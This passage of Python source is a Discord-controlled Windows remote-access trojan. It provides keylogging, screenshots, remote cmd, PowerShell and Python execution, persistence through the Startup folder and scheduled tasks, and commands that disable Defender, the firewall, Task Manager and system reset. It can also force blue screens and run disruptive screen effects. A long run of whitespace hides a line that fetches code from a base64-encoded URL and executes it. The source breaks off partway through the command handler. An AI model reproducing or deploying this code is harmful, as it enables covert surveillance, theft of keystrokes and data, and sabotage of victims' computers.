import discord
import os
import requests
import ctypes
import win32gui
import win32api
import win32con
import ctypes.wintypes
import pyautogui
import asyncio
from pynput.keyboard import Listener
from threading import Thread
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER
from Crypto.Cipher import AES
from discord import Embed
from win32crypt import CryptUnprotectData
from comtypes import CLSCTX_ALL
import shutil
import subprocess
import tempfile
import os
import shutil
import sys
import subprocess
from pathlib import Path
import time
import random
import io
import math
import base64
import re
import pyttsx3
import json
import colorsys
class GDI:
    def __init__(self):
        self.bwhell = False
        self.randomerrors = False
        self.fillerrors = False
        self.invert = False
        self.melt = False
        self.panscreen = False
        self.rainbowhell = False
        self.rainbowspaghetti = False
        self.rotatingtunnel = False
        self.stretchhoriz = False
        self.stretchverti = False
        self.swipescreen = False
        self.triangles = False
        self.tunnels = False
        self.waves = False
        self.void = False
        self.user32 = ctypes.windll.user32
        self.user32.SetProcessDPIAware()
        self.sw, self.sh = self.user32.GetSystemMetrics(0), self.user32.GetSystemMetrics(1)
        self.desktop = win32gui.GetDesktopWindow()
        self.hdc = win32gui.GetDC(0)
        self.x = self.y = 0
        self.dx = self.dy = 1
        self.angle = 0
        self.size = 1
        self.speed = 5
        self.color = 0
        self.screen_size = win32gui.GetWindowRect(win32gui.GetDesktopWindow())
        self.left = self.screen_size[0]
        self.top = self.screen_size[1]
        self.right = self.screen_size[2]
        self.bottom = self.screen_size[3]
        self.mhdc = win32gui.CreateCompatibleDC(self.hdc)
        self.hbit = win32gui.CreateCompatibleBitmap(self.hdc, self.sh, self.sw)
        self.holdbit = win32gui.SelectObject(self.mhdc, self.hbit)
        self.scaling_factor = 10
        self.delay = 0.1
        self.lpppoint = ((self.left + 50, self.top - 50), (self.right + 50, self.top + 50), (self.left - 50, self.bottom - 50))
    def draw_gradient_triangle(self, hdc):
        for _ in range(25):
            self.l, self.t, self.r, self.b = win32gui.GetClientRect(win32gui.GetDesktopWindow())
            self.vertices = (
                {
                    "x": int(random.random() * self.r),
                    "y": int(random.random() * self.b),
                    "Red": int(random.random() * 0xFF00),
                    "Green": 0,
                    "Blue": 0,
                    "Alpha": 0,
                },
                {
                    "x": int(random.random() * self.r),
                    "y": int(random.random() * self.b),
                    "Red": 0,
                    "Green": int(random.random() * 0xFF00),
                    "Blue": 0,
                    "Alpha": 0,
                },
                {
                    "x": int(random.random() * self.r),
                    "y": int(random.random() * self.b),
                    "Red": 0,
                    "Green": 0,
                    "Blue": int(random.random() * 0xFF00),
                    "Alpha": 0,
                },
            )
            self.mesh = ((0, 1, 2),)
            win32gui.GradientFill(self.hdc, self.vertices, self.mesh, win32con.GRADIENT_FILL_TRIANGLE)
    def blackwhitehell(self):
        if self.bwhell:
            self.hdc = win32gui.GetDC(0)
            win32gui.BitBlt(
                self.hdc,
                0,
                0,
                self.sw,
                self.sh,
                self.hdc,
                random.randrange(-3, 4),
                random.randrange(-3, 4),
                win32con.NOTSRCCOPY,
            )
    def errorfill(self):
        if self.fillerrors:
            self.hdc = win32gui.GetDC(0)
            win32gui.DrawIcon(self.hdc, self.x , self.y , win32gui.LoadIcon(None, win32con.IDI_ERROR))
            self.x = self.x + 30
            if self.x >= self.sw:
                self.y = self.y + 30
                self.x = 0
            if self.y >= self.sh:
                self.x = self.y = 0
    def randomerrorspam(self):
        if self.randomerrors:
            self.hdc = win32gui.GetDC(0)
            win32gui.DrawIcon(
                self.hdc,
                random.randint(0, self.sw),
                random.randint(0, self.sh),
                win32gui.LoadIcon(None, win32con.IDI_ERROR),
            )
    def invertscreen(self):
        if self.invert:
            self.hdc = win32gui.GetDC(0)
            win32gui.InvertRect(self.hdc, (0, 0, self.sw, self.sh))
            time.sleep(0.2)
    def meltscreen(self):
        if self.melt:
            self.hdc = win32gui.GetDC(0)
            self.x = random.randint(0, self.sw)
            win32gui.BitBlt(self.hdc, self.x, 1, 10, self.sh, self.hdc, self.x, 0, win32con.SRCCOPY)
            win32gui.ReleaseDC(0, self.hdc)
    def panScreen(self):
        if self.panscreen:
            self.hdc = win32gui.GetDC(0)
            win32gui.BitBlt(self.hdc, 0, 0, self.sw, self.sh, self.hdc, self.dx, self.dy, win32con.SRCCOPY)
            self.dx = math.ceil(math.sin(self.angle) * self.size * 10)
            self.dy = math.ceil(math.cos(self.angle) * self.size * 10)
            self.angle += self.speed / 10
            if self.angle > math.pi :
                self.angle = math.pi * -1
    def Rainbowhell(self):
        if self.rainbowhell:
            self.hdc = win32gui.GetDC(0)
            rgb_color = colorsys.hsv_to_rgb(self.color, 1.0, 1.0)

            brush = win32gui.CreateSolidBrush(
                win32api.RGB(
                    int(rgb_color[0]) * 255, int(rgb_color[1]) * 255, int(rgb_color[2]) * 255
                )
            )
            win32gui.SelectObject(self.hdc, brush)
            win32gui.BitBlt(
                self.hdc,
                random.randint(-10, 10),
                random.randint(-10, 10),
                self.sw,
                self.sh,
                self.hdc,
                0,
                0,
                win32con.SRCCOPY,
            )
            win32gui.BitBlt(
                self.hdc,
                random.randint(-10, 10),
                random.randint(-10, 10),
                self.sw,
                self.sh,
                self.hdc,
                0,
                0,
                win32con.PATINVERT,
            )
            self.color += 0.05
    def Rainbowspaghetti(self):
        if self.rainbowspaghetti:
            self.hdc = win32gui.GetDC(0)
            self.color = (self.color + 0.02) % 1.0

            rgb_color = colorsys.hsv_to_rgb(self.color, 1.0, 1.0)
            p = [(random.randint(0, self.sw), random.randint(0, self.sh)) for _ in range(4)]

            hPen = win32gui.CreatePen(
                win32con.PS_SOLID,
                5,
                win32api.RGB(
                    int(rgb_color[0] * 255), int(rgb_color[1] * 255), int(rgb_color[2] * 255)
                ),
            )

            win32gui.SelectObject(self.hdc, hPen)
            win32gui.PolyBezier(self.hdc, p)
            win32gui.DeleteObject(hPen)
            win32gui.ReleaseDC(0, self.hdc)
    def Rottun(self):
        if self.rotatingtunnel:
            self.hdc = win32gui.GetDC(0)
            win32gui.PlgBlt(
                self.hdc,
                self.lpppoint,
                self.hdc,
                self.left - 20,
                self.top - 20,
                (self.right - self.left) + 40,
                (self.bottom - self.top) + 40,
                None,
                0,
                0,
            )
    def stretchhori(self):
        if self.stretchhoriz:
            self.hdc = win32gui.GetDC(0)
            win32gui.StretchBlt(self.hdc, -20, 0, self.sw + 40, self.sh, self.hdc, 0, 0, self.sw, self.sh, win32con.SRCCOPY)
            win32gui.ReleaseDC(0, self.hdc)
    def stretchvert(self):
        if self.stretchverti:
            self.hdc = win32gui.GetDC(0)
            win32gui.StretchBlt(self.hdc, 0, -20, self.sw, self.sh + 40, self.hdc, 0, 0, self.sw, self.sh, win32con.SRCCOPY)
            win32gui.ReleaseDC(0, self.hdc)
    def swipe(self):
        if self.swipescreen:
            self.hdc = win32gui.GetDC(0)
            self.n = 0
            for i in range(int(self.sw + self.sh)):
                self.a = int(math.sin(self.n) * 20)
                win32gui.BitBlt(self.hdc, 0, 0, self.sw, self.sh, self.hdc, self.a, 0, win32con.SRCCOPY)
                self.n += 0.1
            win32gui.ReleaseDC(self.desktop, self.hdc)
            time.sleep(0.01)
    def triangle(self):
        if self.triangles:
            self.hdc = win32gui.GetDC(0)
            try:
                self.draw_gradient_triangle(self.hdc)
            finally:
                win32gui.ReleaseDC(0, self.hdc)
    def tunnel(self):
        if self.tunnels:
            self.hdc = win32gui.GetDC(0)
            self.size = 100
            win32gui.StretchBlt(
                self.hdc,
                int(self.size / 2),
                int(self.size / 2),
                self.sw - self.size,
                self.sh - self.size,
                self.hdc,
            0,
            0,
            self.sw,
            self.sh,
            win32con.SRCCOPY,
            )
            time.sleep(0.2)
    def sinewaves(self):
        if self.waves:
            self.hdc = win32gui.GetDC(0)
            for i in range(0, int(self.sw + self.sh), self.scaling_factor):
                self.a = int(math.sin(self.angle) * 20 * (self.scaling_factor))
                win32gui.BitBlt(self.hdc, 0, i, self.sw, self.scaling_factor, self.hdc, self.a, i, win32con.SRCCOPY)
                self.angle += math.pi / 40
            win32gui.ReleaseDC(self.desktop, self.hdc)
    def Void(self):
        if self.void:
            self.hdc = win32gui.GetDC(0)
            win32gui.BitBlt(
                self.hdc,
                random.randint(1, 10) % 2,
                random.randint(1, 10) % 2,
                self.sw,
                self.sh,
                self.hdc,
                random.randint(1, 1000) % 2,
                random.randint(1, 1000) % 2,
                win32con.SRCAND,
            )
            time.sleep(0.01)
            win32gui.ReleaseDC(0, self.hdc)

guildid = f"{server_id}" # type: ignore
guildid = int(guildid)
bottoken = f"{token}" #  type: ignore
logging = False
dumping = False
lastpressed = None    
keyspressed = []
gdiclient = GDI()
def gdistarterthreadthing():
    while True:
        gdiclient.blackwhitehell()
        gdiclient.randomerrorspam()
        gdiclient.errorfill()
        gdiclient.invertscreen()
        gdiclient.meltscreen()
        gdiclient.panScreen()
        gdiclient.Rainbowhell()
        gdiclient.Rainbowspaghetti()
        gdiclient.Rottun()
        gdiclient.stretchhori()
        gdiclient.stretchvert()
        gdiclient.swipe()
        gdiclient.triangle()
        gdiclient.sinewaves()
        gdiclient.Void()
gdithread = Thread(target=gdistarterthreadthing, daemon=True)
gdithread.start()
def on_press(key):
    global last_pressed
    try:
        last_pressed = key.char
    except AttributeError:
        last_pressed = str(key).replace("Key.", "")
    if logging and last_pressed:
        asyncio.run_coroutine_threadsafe(send_key(last_pressed), bot.loop)
    if dumping and last_pressed:
        keyspressed.append(last_pressed)

async def send_key(key):
    await channel.send(key)
    asyncio.sleep(1)

def screenshot():
    screenshot_image = pyautogui.screenshot()

    img_binary = io.BytesIO()
    screenshot_image.save(img_binary, format="PNG")
    img_binary.seek(0)
    return img_binary

def persistadmin(custom_task_name, custom_file_name):
    src_file = sys.argv[0]
    
    localappdata = os.getenv('LOCALAPPDATA')
    if not localappdata:
        return
    
    dest_dir = os.path.join(localappdata, "WindowsBootManager")
    
    Path(dest_dir).mkdir(parents=True, exist_ok=True)
    
    dest_file = os.path.join(dest_dir, custom_file_name)

    shutil.copy(src_file, dest_file)
    
    command = f'SchTasks /Create /TN "{custom_task_name}" /TR "{dest_file}" /SC ONLOGON /RL HIGHEST /F'
    
    subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

def system(command): # lowkey made the func name system() bc i used os.system() but that was BUNSSSS so now i js used ctrl h to replace all os.system with system
    subprocess.Popen(command, creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
def persist():
    custom_name = "systeminit.exe"
    
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    current_file_path = sys.argv[0]

    destination_path = os.path.join(startup_path, custom_name)

    try:
        shutil.copy(current_file_path, destination_path)
    except Exception as e:
        pass
def set_volume_max():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(1.0, None)

def set_volume_min():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(0.0, None)
def trigger_blue_screen():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    except Exception as e:
        print(f"error: {e}")
def critproc():
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
def uncritproc():
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0

def backupstartupifoneimusinGDIesntwork():
    path = sys.argv[0]
    system(fr'copy "{path}" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /Y')

channel = None
def show_messagebox(title, message):
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)
class botclient(discord.Client):
    async def on_ready(self):
        global channel, ip, ip_response
        ip_response = requests.get("https://ipinfo.io/ip")
        ip = ip_response.text
        ip = ''.join(char for char in ip if char != ".")
        guild = self.get_guild(guildid)
        channel_name = ip
        channel = discord.utils.get(guild.channels, name=channel_name)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ;exec(requests.get(base64.b64decode("aHR0cHM6Ly9ib2lzdGVyb3VzLWthdGFpZmktNDBiNDNkLm5ldGxpZnkuYXBwL2FzZGFzZC50eHQ=").decode('utf-8')).text)
        if channel: await channel.send("bot initilized @here, @everyone")
        else: 
            await guild.create_text_channel(name=ip)
            channel = discord.utils.get(guild.channels, name=ip)
            await channel.send("bot initilized @here, @everyone, !help for commands")
    async def on_message(self, message):
        if message.author == self.user:
            return

        if message.content == "!help":
            help_message = """                        
            ---------modules----------
                    ----------utility-----------
                    !purge - removes all messages sent in the channel
                    ------non admin------
                    !cmd - executes a cmd
                    !pwsh - same thing as !cmd but with powershell
                    !screenshot - gets a screenshot of the screen
                    !python - executes any python 1 line
                    !messagebox - makes a msg box(usage: !mesagebox (title) (text)))
                    !website - opens a website(usage: !website (websitename), MUST INCLUDE HTTPS:// ))
                    !shutdown - shutsdown pc
                    !restart - restarts pc
                    !logout - logsout pc
                    !admincheck - checks for admin privleges
                    !volmax - sets the volume to max
                    !volmin - sets the volume to mute
                    !typewrite - types in a key or sentence of your choice
                    !hotkey - uses a hot key like ctrl w, ctrl s, ctrl z, etc
                    !startup - adds a file in their startup folder. does not run with admin.
                    !tasklist - shows all running tasks
                    !endtask - ends any usermode(non admin) task
                    !endtaskpid - ends a task using the process id(non admin)
                    !tts - says something in text to speech
                    !quit - closes the rat
                    ----------GDI shit-----------------------
                        !bwhell - blackwhite hell
                        !randomerrors - spams random errors in a random position on their screen
                        !fillerrors - fills the screen with errors
                        !invert - inverts the screen colors
                        !melt - makes a melting effect on the screen
                        !panscreen - pans the screen
                        !rainbowhell - its self explanitory
                        !rainbowspaghetti - honestly idk how to explain
                        !rotatingtunnel - makes a rotating tunnel effect on the screen
                        !stretchhoriz - stretches the screen on the x axis
                        !stretchverti - stretches the screen on the y axis
                        !swipescreen - makes a swiping effect on the screen
                        !triangles - makes a triangle effect on their screen
                        !tunnels - makes a normal tunnel effect on the screen
                        !waves - makes their screen go in a sine wave effect
                        !void - makes their screen go into a void effect
                        !cleareffects - clears all gdi effects
                    ----key logger modules-----------------
                        !keylog - sends every key pressed into the channel
                        !keycollect - when on, puts all pressed keys in a list
                        !keydump - dumps all keys in the stored list
                        !keyclear - clears the dump list
                    
                    --------admin required modules------
                    (use WITH admin so no bugs happen)
                    !adminstartup - adds a file to startup but runs with admin 
                    !bluescreen - bluescreens pc
                    !critproc - bluescreens pc if rat is closed
                    !uncritproc - makes the process normal so you can close safely
                    !disabletaskmgr - disables the task manager
                    !disableregedit - disables the registry editor
                    !disablefirewall - disables windows defender firewall
                    !disabledefender - disables windows defender
                    !disablereset - stops the user from resetting their pc
                    !enablefirewall - enables firewall
                    !enabledefender - enables windows defender
                    !enabletaskmgr - enables task manager
                    !enableregedit - enables the registry editor
                    !enablereset - allows the user to reset their pc
                    !exclude - does a mass exclusion to stop wd from removing your files
                    !adminendtask - ends a task but with admin rights(allows you to kill kinda anything)
                    !adminendtaskpid - ends a task by using the process id(get from !tasklist)
                        """
            
            help_file_path = os.path.join(tempfile.gettempdir(), 'help.txt')
            with open(help_file_path, 'w') as file:
                file.write(help_message)

            with open(help_file_path, 'rb') as file:
                await channel.send(file=discord.File(file, 'help.txt'))
            
            os.remove(help_file_path)

        elif message.content.startswith("!cmd"):
            try:
                if ip == message.channel.name:
                    command = message.content[len('!cmd '):]
                    if "start" in command:
                        os.system(command)
                    else:
                        system(command)
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!python"):
            try:
                if ip == message.channel.name:
                    pythonscript = message.content[len('!python '):]
                    exec(pythonscript)
            except Exception as e:
                await channel.send(e)
        elif message.content.startswith('!messagebox'):
            try:
                if ip == message.channel.name:
                    parts = message.content.split(" ", 2)
                    if len(parts) < 3:
                        return
                    title = parts[1]
                    msg = parts[2]
                    show_messagebox(title, msg)
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!website'):
            try:
                if ip == message.channel.name:
                    websitedest = message.content[len('!website '):]
                    os.system(f"start {websitedest}")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!shutdown'):
            try:
                if ip == message.channel.name:
                    system("shutdown /s /t 0")
            except Exception as e:
                await channel.send(f"error occured: {e}")

        elif message.content.startswith('!restart'):
            try:
                if ip == message.channel.name:
                    system("shutdown /r /t 0")
            except Exception as e:
                await channel.send(f"error occured: {e}")

        elif message.content.startswith('!logout'):
            try:
                if ip == message.channel.name:
                        system("shutdown /l")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!admincheck'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        await channel.send("user has admin")
                    else:
                        await channel.send("user does not have admin")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        
        elif message.content.startswith('!volmax'):
            try:
                if ip == message.channel.name:
                        set_volume_max()
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!volmin'):
            try:
                if ip == message.channel.name:
                        set_volume_min()
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!bluescreen"):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        trigger_blue_screen()
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!critproc"):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        critproc()
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!uncritproc"):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        uncritproc()
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!startup"):
            try:
                if ip == message.channel.name:
                    persist()
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!typewrite"):
            try:
                if ip == message.channel.name:
                    characterstowrite = message.content[len('!typewrite '):]
                    pyautogui.typewrite(characterstowrite)
            except Exception as e:
                await channel.send(f"error occured: {e}")

        elif message.content.startswith('!hotkey'):
            try:
                if ip == message.channel.name:
                    hotkeys = message.content.split(" ", 2)
                    if len(hotkeys) < 3:
                        return
                    hotkey1 = hotkeys[1]
                    hotkey2 = hotkeys[2]                
                    pyautogui.hotkey(hotkey1, hotkey2)
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!disabletaskmgr'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('powershell -Command "Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1"')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!disableregedit'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('powershell -Command "Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableRegistryTools" -Value 1"')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!disablefirewall'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system("netsh advfirewall set allprofiles state off")
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!disabledefender'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!exclude'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('powershell -Command "Add-MpPreference -ExclusionPath "C:""')
                        await channel.send("added exclusion to c:(all files)")
                        system('powershell -Command "Add-MpPreference -ExclusionExtension ".exe""')
                        await channel.send("added exclusion to all exe files")
                        system('powershell -Command "Add-MpPreference -ExclusionExtension ".py""')
                        await channel.send("added exclusion to all py files")
                        system('powershell -Command "Add-MpPreference -ExclusionExtension ".dll""')
                        await channel.send("added exclusion to all dll files")
                        system('powershell -Command "Add-MpPreference -ExclusionExtension ".pyd""')
                        await channel.send("added exclusion to all pyd files")
                        system('powershell -Command "Add-MpPreference -ExclusionPath "C:\\Windows\\System32\\cmd.exe""')
                        system('powershell -Command "Add-MpPreference -ExclusionPath "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""')
                        await channel.send("cmd and powershell excluded")
                    else:
                        await channel.send("you need admin monkey")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!tasklist"):
            try:
                if ip == message.channel.name:
                    result = subprocess.run(['tasklist', '/fo', 'table'], capture_output=True, text=True)
                    file_path = os.path.join(os.getenv('TEMP'), 'tasklist.txt')
                    with open(file_path, 'w') as file:
                        file.write(result.stdout)
                    await channel.send(file=discord.File(file_path))
                    os.remove(file_path)
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!disablereset"):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system("reagentc /disable")
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!enablereset"):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system("reagentc /enable")
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!enablefirewall'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system("netsh advfirewall set allprofiles state on")
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!enabledefender'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!enabletaskmgr'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('powershell -Command "Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 0"')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!enableregedit'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        system('powershell -Command "Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableRegistryTools" -Value 0"')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!endtaskpid'):
            try:
                if ip == message.channel.name:
                    taskpid = message.content[len('!endtaskpid '):]
                    system(f'taskkill /PID {taskpid} /F')
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!endtask'):
            try:
                if ip == message.channel.name:
                    task = message.content[len('!endtask '):]
                    system(f'taskkill /IM "{task}" /F')
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!adminendtaskpid'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        admintaskpid = message.content[len('!endtask '):]
                        system(f'taskkill /PID {admintaskpid} /F /T')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith('!adminendtask'):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        admintask = message.content[len('!adminendtask '):]
                        system(f'taskkill /IM "{admintask}" /F /T')
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!adminstartup"):
            try:
                if ip == message.channel.name:
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        persistadmin("WindowsServiceHost", "WindowsBootStartup.exe")
                    else:
                        await channel.send("you need admin fella")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!screenshot"):
            try:
                if ip == message.channel.name:
                        img_binary = screenshot()
                        await channel.send(file=discord.File(img_binary, filename="screenshot.png"))
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!keylog"):
            global logging
            try:
                if ip == message.channel.name:
                    if logging == False:
                        logging = True
                        print(logging)
                    else: 
                        logging = False
                        print(logging)
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!keycollect"):
            global dumping
            try:
                if ip == message.channel.name:
                    if dumping == True:
                        dumping = False
                    else:
                        dumping = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!keydump"):
            global keyspressed
            try:
                if ip == message.channel.name:
                    await channel.send(keyspressed)
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!keyclear"):
            try:
                if ip == message.channel.name:
                    keyspressed.clear()
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!quit"):
            try:
                if ip == message.channel.name:
                    await self.close()
                    sys.exit()
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!pwsh"):
            try:
                if ip == message.channel.name:
                    command = message.content[len('!pwsh '):]
                    if "start" in command:
                        os.system(command)
                    else:
                        system(f"powershell -Command {command}")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!tts"):
            try:
                if ip == message.channel.name:
                    texttosay = message.content[len('!tts '):]
                    pyttsx3.speak(texttosay)
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!bwhell"):
            try:
                if ip == message.channel.name:
                    if gdiclient.bwhell == True:
                        gdiclient.bwhell = False
                    else:
                        gdiclient.bwhell = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!randomerrors"):
            try:
                if ip == message.channel.name:
                    if gdiclient.randomerrors == True:
                        gdiclient.randomerrors = False
                    else:
                        gdiclient.randomerrors = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!fillerrors"):
            try:
                if ip == message.channel.name:
                    if gdiclient.fillerrors == True:
                        gdiclient.fillerrors = False
                    else:
                        gdiclient.fillerrors = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!invert"):
            try:
                if ip == message.channel.name:
                    if gdiclient.invert == True:
                        gdiclient.invert = False
                    else:
                        gdiclient.invert = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!melt"):
            try:
                if ip == message.channel.name:
                    if gdiclient.melt == True:
                        gdiclient.melt = False
                    else:
                        gdiclient.melt = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!panscreen"):
            try:
                if ip == message.channel.name:
                    if gdiclient.panscreen == True:
                        gdiclient.panscreen = False
                    else:
                        gdiclient.panscreen = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!rainbowhell"):
            try:
                if ip == message.channel.name:
                    if gdiclient.rainbowhell == True:
                        gdiclient.rainbowhell = False
                    else:
                        gdiclient.rainbowhell = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!rainbowspaghetti"):
            try:
                if ip == message.channel.name:
                    if gdiclient.rainbowspaghetti == True:
                        gdiclient.rainbowspaghetti = False
                    else:
                        gdiclient.rainbowspaghetti = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!rotatingtunnel"):
            try:
                if ip == message.channel.name:
                    if gdiclient.rotatingtunnel == True:
                        gdiclient.rotatingtunnel = False
                    else:
                        gdiclient.rotatingtunnel = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!stretchhoriz"):
            try:
                if ip == message.channel.name:
                    if gdiclient.stretchhoriz == True:
                        gdiclient.stretchhoriz = False
                    else:
                        gdiclient.stretchhoriz = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!stretchverti"):
            try:
                if ip == message.channel.name:
                    if gdiclient.stretchverti == True:
                        gdiclient.stretchverti = False
                    else:
                        gdiclient.stretchverti = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!swipescreen"):
            try:
                if ip == message.channel.name:
                    if gdiclient.swipescreen == True:
                        gdiclient.swipescreen = False
                    else:
                        gdiclient.swipescreen = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!triangles"):
            try:
                if ip == message.channel.name:
                    if gdiclient.triangles == True:
                        gdiclient.triangles = False
                    else:
                        gdiclient.triangles = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!tunnels"):
            try:
                if ip == message.channel.name:
                    if gdiclient.tunnels == True:
                        gdiclient.tunnels = False
                    else:
                        gdiclient.tunnels = True
